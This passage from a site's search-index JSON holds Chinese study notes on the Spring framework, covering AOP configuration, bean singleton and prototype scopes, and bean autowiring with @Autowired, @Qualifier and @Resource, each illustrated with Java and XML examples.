<aop:config> <aop:aspect ref= \"customLog\" > <aop:pointcut id= \"pointcut\" expression= \"execution(* top.longlone.service.UserServiceImpl.*(..))\" /> <aop:before method= \"before\" pointcut-ref= \"pointcut\" /> <aop:after method= \"after\" pointcut-ref= \"pointcut\" /> </aop:aspect> </aop:config> </beans> \u5b9e\u73b0\u65b9\u5f0f\u4e09:\u6ce8\u89e3 # package top.longlone.log ; import org.aspectj.lang.annotation.After ; import org.aspectj.lang.annotation.Aspect ; import org.aspectj.lang.annotation.Around ; import org.aspectj.lang.annotation.Before ; @Aspect public class AnnotationLog { @Before ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void before () { System . out . println ( \"==\u6267\u884c\u524d==\" ); } @After ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void after () { System . out . println ( \"==\u6267\u884c\u540e==\" ); } @Around ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void around ( ProceedingJoinPoint jp ) throws Throwable { System . out . println ( \"\u73af\u7ed5\u524d\" ); System . out . println ( jp . getSignature ()); // \u8f93\u51fa\u7b7e\u540d System . out . println ( jp . getTarget ()); // \u83b7\u53d6\u88ab\u901a\u77e5\u5bf9\u8c61\u5e76\u8f93\u51fa Object proceed = jp . proceed (); System . out . println ( \"\u73af\u7ed5\u540e\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"annotaionLog\" class= \"top.longlone.log.AnnotationLog\" /> <!-- \u5f00\u542f\u6ce8\u89e3\u652f\u6301 JDK proxy-target-class=\"false\" cglib proxy-target-class=\"true\" --> <aop:aspectj-autoproxy/> </beans> \u603b\u7ed3 # Spring\u4e2d\u7684AOP\u5176\u5b9e\u662f\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u5b9e\u73b0\u7684\u3002AOP\u6709\u51e0\u79cd\u4f7f\u7528\u65b9\u5f0f\uff0c\u5206\u522b\u662f: 1. \u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3 2. \u4f7f\u7528\u81ea\u5b9a\u4e49\u7c7b 3. \u4f7f\u7528\u6ce8\u89e3","title":"AOP"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#aop","text":"AOP\u662fAspect Oriented Programming\uff0c\u5373\u9762\u5411\u5207\u9762\u7f16\u7a0b\u3002AOP\u662f\u4e00\u79cd\u65b0\u7684\u7f16\u7a0b\u65b9\u5f0f\uff0c\u5b83\u548cOOP\u4e0d\u540c\uff0cOOP\u628a\u7cfb\u7edf\u770b\u4f5c\u591a\u4e2a\u5bf9\u8c61\u7684\u4ea4\u4e92\uff0cAOP\u628a\u7cfb\u7edf\u5206\u89e3\u4e3a\u4e0d\u540c\u7684\u5173\u6ce8\u70b9\uff0c\u6216\u8005\u79f0\u4e4b\u4e3a\u5207\u9762\uff08Aspect\uff09\u3002","title":"AOP"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#springaop","text":"\u5728SpringAOP\u4e2d\uff0c\u901a\u8fc7Advice\u5b9a\u4e49\u6a2a\u5207\u903b\u8f91\uff0cSpring\u652f\u63015\u79cd\u7c7b\u578b\u7684Advice:","title":"SpringAOP"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5bfc\u5165\u4f9d\u8d56","text":"\u8981\u5728Spring\u4e2d\u4f7f\u7528AOP\u7ec7\u5165\uff0c\u9700\u8981\u5bfc\u5165\u4ee5\u4e0b\u4f9d\u8d56 <dependency> <groupId> org.aspectj </groupId> <artifactId> aspectjweaver </artifactId> <version> 1.9.8.M1 </version> </dependency>","title":"\u5bfc\u5165\u4f9d\u8d56"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5b9e\u73b0\u65b9\u5f0f\u4e00\u539f\u751fspirng-api\u63a5\u53e3","text":"package top.longlone.service ; public interface UserService { public void add (); public void delete (); public void update (); public void query (); } package top.longlone.service ; import org.springframework.stereotype.Service ; public class UserServiceImpl implements UserService { @Override public void add () { System . out . println ( \"\u589e\u52a0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void delete () { System . out . println ( \"\u5220\u9664\u4e00\u4e2a\u7528\u6237\" ); } @Override public void update () { System . out . println ( \"\u66f4\u65b0\u4e00\u4e2a\u7528\u6237\" ); } @Override public void query () { System . out . println ( \"\u67e5\u8be2\u4e00\u4e2a\u7528\u6237\" ); } } package top.longlone.log ; import org.springframework.aop.AfterReturningAdvice ; import org.springframework.aop.MethodBeforeAdvice ; import java.lang.reflect.Method ; public class Log implements MethodBeforeAdvice , AfterReturningAdvice { @Override public void before ( Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u4e4b\u524d\" ); } @Override public void afterReturning ( Object returnValue , Method method , Object [] args , Object target ) throws Throwable { System . out . println ( target . getClass (). getName () + \"\u7684\" + method . getName () + \"\u6267\u884c\u5b8c\u6bd5\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <!-- \u65b9\u5f0f\u4e00:\u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3--> <!-- \u5bfc\u5165aop\uff0c\u9700\u8981\u5bfc\u5165aop\u7684\u7ea6\u675f --> <aop:config> <!-- \u589e\u52a0\u5207\u5165\u70b9\uff0cexpression:execution(\u4fee\u9970\u7b26 \u8fd4\u56de\u503c \u7c7b\u540d \u65b9\u6cd5\u540d \u53c2\u6570) --> <aop:pointcut id= \"pointcut\" expression= \"execution(public * top.longlone.service.UserServiceImpl.*(..))\" /> <aop:advisor advice-ref= \"log\" pointcut-ref= \"pointcut\" /> </aop:config> </beans>","title":"\u5b9e\u73b0\u65b9\u5f0f\u4e00:\u539f\u751fSpirng API\u63a5\u53e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5b9e\u73b0\u65b9\u5f0f\u4e8c\u81ea\u5b9a\u4e49\u7c7b","text":"\u8fd9\u79cd\u65b9\u5f0f\u6709\u4e00\u4e2a\u7f3a\u70b9\u662f\u65e0\u6cd5\u62ff\u5230\u5207\u5165\u70b9\u548cTarget\u7684\u4fe1\u606f\uff0c\u4f18\u70b9\u662f\u66f4\u597d\u7406\u89e3\u3002 package top.longlone.log ; public class CustomLog { public void before () { System . out . println ( \"====\u6267\u884c\u524d====\" ); } public void after () { System . out . println ( \"====\u6267\u884c\u540e====\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"customLog\" class= \"top.longlone.log.CustomLog\" /> <aop:config> <aop:aspect ref= \"customLog\" > <aop:pointcut id= \"pointcut\" expression= \"execution(* top.longlone.service.UserServiceImpl.*(..))\" /> <aop:before method= \"before\" pointcut-ref= \"pointcut\" /> <aop:after method= \"after\" pointcut-ref= \"pointcut\" /> </aop:aspect> </aop:config> </beans>","title":"\u5b9e\u73b0\u65b9\u5f0f\u4e8c:\u81ea\u5b9a\u4e49\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u5b9e\u73b0\u65b9\u5f0f\u4e09\u6ce8\u89e3","text":"package top.longlone.log ; import org.aspectj.lang.annotation.After ; import org.aspectj.lang.annotation.Aspect ; import org.aspectj.lang.annotation.Around ; import org.aspectj.lang.annotation.Before ; @Aspect public class AnnotationLog { @Before ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void before () { System . out . println ( \"==\u6267\u884c\u524d==\" ); } @After ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void after () { System . out . println ( \"==\u6267\u884c\u540e==\" ); } @Around ( \"execution(* top.longlone.service.UserServiceImpl.*(..))\" ) public void around ( ProceedingJoinPoint jp ) throws Throwable { System . out . println ( \"\u73af\u7ed5\u524d\" ); System . out . println ( jp . getSignature ()); // \u8f93\u51fa\u7b7e\u540d System . out . println ( jp . getTarget ()); // \u83b7\u53d6\u88ab\u901a\u77e5\u5bf9\u8c61\u5e76\u8f93\u51fa Object proceed = jp . proceed (); System . out . println ( \"\u73af\u7ed5\u540e\" ); } } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop= \"http://www.springframework.org/schema/aop\" xsi:schemaLocation= \" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\" > <bean id= \"userService\" class= \"top.longlone.service.UserServiceImpl\" /> <bean id= \"log\" class= \"top.longlone.log.Log\" /> <bean id= \"annotaionLog\" class= \"top.longlone.log.AnnotationLog\" /> <!-- \u5f00\u542f\u6ce8\u89e3\u652f\u6301 JDK proxy-target-class=\"false\" cglib proxy-target-class=\"true\" --> <aop:aspectj-autoproxy/> </beans>","title":"\u5b9e\u73b0\u65b9\u5f0f\u4e09:\u6ce8\u89e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/AOP/#\u603b\u7ed3","text":"Spring\u4e2d\u7684AOP\u5176\u5b9e\u662f\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u5b9e\u73b0\u7684\u3002AOP\u6709\u51e0\u79cd\u4f7f\u7528\u65b9\u5f0f\uff0c\u5206\u522b\u662f: 1. \u4f7f\u7528\u539f\u751fSpring API\u63a5\u53e3 2. \u4f7f\u7528\u81ea\u5b9a\u4e49\u7c7b 3. \u4f7f\u7528\u6ce8\u89e3","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/","tags":["java","spring"],"text":"Bean\u7684\u4f5c\u7528\u57df # singleton \u5355\u4f8b\u6a21\u5f0f # Bean\u7684\u9ed8\u8ba4\u4f5c\u7528\u57df\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bBean\u90fd\u662f\u5355\u4f8b\u6a21\u5f0f\uff0c\u5373\u65e0\u8bba\u83b7\u53d6\u591a\u5c11\u6b21Bean\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u76f8\u540c\u7684\u5b9e\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u663e\u5f0f\u5730\u58f0\u660e\u8fd9\u4e2a\u4f5c\u7528\u57df: <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"singleton\" /> prototype \u539f\u578b\u6a21\u5f0f # \u4e0e\u5355\u4f8b\u6a21\u5f0f\u5bf9\u5e94\uff0c\u6bcf\u6b21\u83b7\u53d6Bean\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u4f8b <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"prototype\" /> \u6d4b\u8bd5\u5982\u4e0b: import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.Student ; import top.longlone.User ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"ApplicationContext.xml\" ); User user = context . getBean ( \"user\" , User . class ); User user2 = context . getBean ( \"user\" , User . class ); System . out . println ( user == user2 ); // false } } \u5176\u4ed6\u4f5c\u7528\u57df # \u5269\u4e0b\u7684\u4f5c\u7528\u57df\u90fd\u5728Web\u5f00\u53d1\u91cc\u624d\u80fd\u7528\u5230 request # session # application # websocket # \u603b\u7ed3 # \u4e3b\u8981\u4e86\u89e3\u4e86Bean\u7684\u4f5c\u7528\u57df\uff0c\u9700\u8981\u5148\u4e86\u89e3\u7684\u6709\u5355\u4f8b\u6a21\u5f0f(singleton)\u548c\u539f\u578b\u6a21\u5f0f(prototype)\uff0c\u4e24\u8005\u7684\u4e3b\u8981\u533a\u522b\u662f\u83b7\u53d6Bean\u65f6\u4f7f\u7528\u76f8\u540c\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8fd8\u662f\u521b\u5efa\u65b0\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002","title":"Bean\u7684\u4f5c\u7528\u57df"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#bean\u7684\u4f5c\u7528\u57df","text":"","title":"Bean\u7684\u4f5c\u7528\u57df"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#singleton-\u5355\u4f8b\u6a21\u5f0f","text":"Bean\u7684\u9ed8\u8ba4\u4f5c\u7528\u57df\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bBean\u90fd\u662f\u5355\u4f8b\u6a21\u5f0f\uff0c\u5373\u65e0\u8bba\u83b7\u53d6\u591a\u5c11\u6b21Bean\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u76f8\u540c\u7684\u5b9e\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u663e\u5f0f\u5730\u58f0\u660e\u8fd9\u4e2a\u4f5c\u7528\u57df: <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"singleton\" />","title":"singleton \u5355\u4f8b\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#prototype-\u539f\u578b\u6a21\u5f0f","text":"\u4e0e\u5355\u4f8b\u6a21\u5f0f\u5bf9\u5e94\uff0c\u6bcf\u6b21\u83b7\u53d6Bean\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u4f8b <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" scope= \"prototype\" /> \u6d4b\u8bd5\u5982\u4e0b: import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.Student ; import top.longlone.User ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"ApplicationContext.xml\" ); User user = context . getBean ( \"user\" , User . class ); User user2 = context . getBean ( \"user\" , User . class ); System . out . println ( user == user2 ); // false } }","title":"prototype \u539f\u578b\u6a21\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#\u5176\u4ed6\u4f5c\u7528\u57df","text":"\u5269\u4e0b\u7684\u4f5c\u7528\u57df\u90fd\u5728Web\u5f00\u53d1\u91cc\u624d\u80fd\u7528\u5230","title":"\u5176\u4ed6\u4f5c\u7528\u57df"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#request","text":"","title":"request"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#session","text":"","title":"session"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#application","text":"","title":"application"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#websocket","text":"","title":"websocket"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/#\u603b\u7ed3","text":"\u4e3b\u8981\u4e86\u89e3\u4e86Bean\u7684\u4f5c\u7528\u57df\uff0c\u9700\u8981\u5148\u4e86\u89e3\u7684\u6709\u5355\u4f8b\u6a21\u5f0f(singleton)\u548c\u539f\u578b\u6a21\u5f0f(prototype)\uff0c\u4e24\u8005\u7684\u4e3b\u8981\u533a\u522b\u662f\u83b7\u53d6Bean\u65f6\u4f7f\u7528\u76f8\u540c\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8fd8\u662f\u521b\u5efa\u65b0\u7684\u5b9e\u4f8b\u5bf9\u8c61\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/","tags":["java","spring"],"text":"Bean\u7684\u88c5\u914d # \u5728Spring\u4e2d\u6709\u4e09\u79cd\u88c5\u914d\u65b9\u5f0f - xml\u914d\u7f6e - java\u4ee3\u7801\u914d\u7f6e - \u9690\u5f0f\u81ea\u52a8\u914d\u7f6e Bean\u7684\u81ea\u52a8\u88c5\u914d # Spring\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u81ea\u52a8\u5bfb\u627e\uff0c\u5e76\u81ea\u52a8\u7ed9Bean\u88c5\u914d\u5c5e\u6027 \u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d # \u4e3b\u8981\u662f\u901a\u8fc7beans\u4e2d\u7684default-autowire\u5c5e\u6027\u6216\u8005bean\u4e2d\u7684autowire\u5c5e\u6027\u6765\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d byName\u81ea\u52a8\u88c5\u914d # \u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyName\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u540d\u76f8\u540c\u7684Beanid\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1Bean\u540d\u5b57\u552f\u4e00\u3002 byType\u81ea\u52a8\u88c5\u914d # \u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyType\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u7c7b\u578b\u76f8\u540c\u7684Bean\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1\u540c\u610f\u7c7b\u578b\u7684Bean\u552f\u4e00\u3002 constructor\u81ea\u52a8\u88c5\u914d # \u548cbyType\u81ea\u52a8\u88c5\u914d\u7c7b\u4f3c\uff0c\u4e5f\u662f\u6839\u636e\u7c7b\u578b\u53bb\u81ea\u52a8\u88c5\u914d\uff0c\u4f46\u662f\u662f\u8c03\u7528\u6784\u9020\u51fd\u6570\u5b9e\u73b0\u4f9d\u8d56\u6ce8\u5165\u3002 \u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d # \u4f9d\u8d56: 1. jdk>=1.5 2. spring>=2.5 \u4f7f\u7528\u524d\u9700\u8981\u5bfc\u5165\u6269\u5c55\u548c\u914d\u7f6e\u6ce8\u89e3\u652f\u6301 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> </beans> \u4f7f\u7528\u65b9\u6cd5 \u4f9d\u7136\u5728xml\u4e2d\u7f16\u5199bean\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u518d\u6ce8\u5165\u5c5e\u6027 <bean id= \"people\" class= \"top.longlone.People\" /> <bean id= \"dog\" class= \"top.longlone.Dog\" /> \u7136\u540e\u5728\u4ee3\u7801\u5c5e\u6027\u4e0a\u4f7f\u7528@Autowired\u6ce8\u89e3\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyType\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\uff0c\u5219\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d package top.longlone ; import org.springframework.beans.factory.annotation.Autowired ; public class People { @Autowired private Dog dog ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 @Autowired\u53ef\u4ee5\u8bbe\u7f6e\u5c5e\u6027required\uff0c\u9ed8\u8ba4\u4e3atrue\uff0c\u82e5\u8bbe\u7f6e\u4e3afalse\uff0c\u5219\u58f0\u660e\u8fd9\u4e2a\u4f9d\u8d56\u662f\u975e\u5fc5\u987b\u7684\uff0c\u53ef\u4ee5\u4e3a\u7a7a ```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; public class People { @Autowired(required = false) private Dog dog; } \u5982\u679c\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\u7684bean\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528@Qualifier\u6ce8\u89e3\u6765\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a\u540d\u5b57\u7684bean ```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; public class People { @Autowired @Qualifier(value = \"dog\") private Dog dog; } \u5728java<11\u4e2djva\u539f\u751f\u81ea\u5e26\u4e86\u4e00\u4e2a@Resource\u6ce8\u89e3\uff0c\u5b83\u7684\u4f5c\u7528\u548c@Autowired\u7c7b\u4f3c\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u65e0\u6cd5\u627e\u5230\u5bf9\u5e94\u7684id\uff0c\u5219\u7c7b\u4f3cbyType\u81ea\u52a8\u88c5\u914d\uff0c\u540c\u65f6\u5b83\u53ef\u4ee5\u6267\u884cname\u5c5e\u6027\u6765\u6307\u5411\u5177\u4f53\u7684\u4e00\u4e2abean package top.longlone ; import javax.annotation.Resource ; public class People { @Resource ( name = \"dog22\" ) private Dog dog ; } java11\u53ca\u4e4b\u540e\u9700\u8981\u901a\u8fc7\u6dfb\u52a0\u4f9d\u8d56\u7684\u65b9\u5f0f\u624d\u80fd\u4f7f\u7528@Resource\u6ce8\u89e3 <dependency> <groupId> javax.annotation </groupId> <artifactId> javax.annotation-api </artifactId> <version> 1.3.1 </version> </dependency> \u603b\u7ed3 # Bean\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662f\u901a\u8fc7xml\u548c\u901a\u8fc7\u6ce8\u89e3\u3002 Bean\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662fbyName\uff0cbyType\u548cconstructor\u3002 Bean\u901a\u8fc7\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u4e2a\u5e38\u89c1\u6ce8\u89e3\uff0c\u5206\u522b@Autowired\uff0c@Qualfilter\uff0c@Resource","title":"Bean\u7684\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#bean\u7684\u88c5\u914d","text":"\u5728Spring\u4e2d\u6709\u4e09\u79cd\u88c5\u914d\u65b9\u5f0f - xml\u914d\u7f6e - java\u4ee3\u7801\u914d\u7f6e - \u9690\u5f0f\u81ea\u52a8\u914d\u7f6e","title":"Bean\u7684\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#bean\u7684\u81ea\u52a8\u88c5\u914d","text":"Spring\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u81ea\u52a8\u5bfb\u627e\uff0c\u5e76\u81ea\u52a8\u7ed9Bean\u88c5\u914d\u5c5e\u6027","title":"Bean\u7684\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d","text":"\u4e3b\u8981\u662f\u901a\u8fc7beans\u4e2d\u7684default-autowire\u5c5e\u6027\u6216\u8005bean\u4e2d\u7684autowire\u5c5e\u6027\u6765\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d","title":"\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#byname\u81ea\u52a8\u88c5\u914d","text":"\u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyName\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u540d\u76f8\u540c\u7684Beanid\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1Bean\u540d\u5b57\u552f\u4e00\u3002","title":"byName\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#bytype\u81ea\u52a8\u88c5\u914d","text":"\u5f53\u8bbe\u7f6e\u5c5e\u6027\u503c\u4e3abyType\u65f6\uff0cBean\u4f1a\u5728\u4e0a\u4e0b\u6587\u4e2d\u5bfb\u627e\u4e0e\u5c5e\u6027\u7c7b\u578b\u76f8\u540c\u7684Bean\u5e76\u81ea\u52a8\u6ce8\u5165\u4f9d\u8d56\uff0c\u5fc5\u987b\u4fdd\u8bc1\u540c\u610f\u7c7b\u578b\u7684Bean\u552f\u4e00\u3002","title":"byType\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#constructor\u81ea\u52a8\u88c5\u914d","text":"\u548cbyType\u81ea\u52a8\u88c5\u914d\u7c7b\u4f3c\uff0c\u4e5f\u662f\u6839\u636e\u7c7b\u578b\u53bb\u81ea\u52a8\u88c5\u914d\uff0c\u4f46\u662f\u662f\u8c03\u7528\u6784\u9020\u51fd\u6570\u5b9e\u73b0\u4f9d\u8d56\u6ce8\u5165\u3002","title":"constructor\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d","text":"\u4f9d\u8d56: 1. jdk>=1.5 2. spring>=2.5 \u4f7f\u7528\u524d\u9700\u8981\u5bfc\u5165\u6269\u5c55\u548c\u914d\u7f6e\u6ce8\u89e3\u652f\u6301 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> </beans> \u4f7f\u7528\u65b9\u6cd5 \u4f9d\u7136\u5728xml\u4e2d\u7f16\u5199bean\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u518d\u6ce8\u5165\u5c5e\u6027 <bean id= \"people\" class= \"top.longlone.People\" /> <bean id= \"dog\" class= \"top.longlone.Dog\" /> \u7136\u540e\u5728\u4ee3\u7801\u5c5e\u6027\u4e0a\u4f7f\u7528@Autowired\u6ce8\u89e3\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyType\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\uff0c\u5219\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d package top.longlone ; import org.springframework.beans.factory.annotation.Autowired ; public class People { @Autowired private Dog dog ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 @Autowired\u53ef\u4ee5\u8bbe\u7f6e\u5c5e\u6027required\uff0c\u9ed8\u8ba4\u4e3atrue\uff0c\u82e5\u8bbe\u7f6e\u4e3afalse\uff0c\u5219\u58f0\u660e\u8fd9\u4e2a\u4f9d\u8d56\u662f\u975e\u5fc5\u987b\u7684\uff0c\u53ef\u4ee5\u4e3a\u7a7a 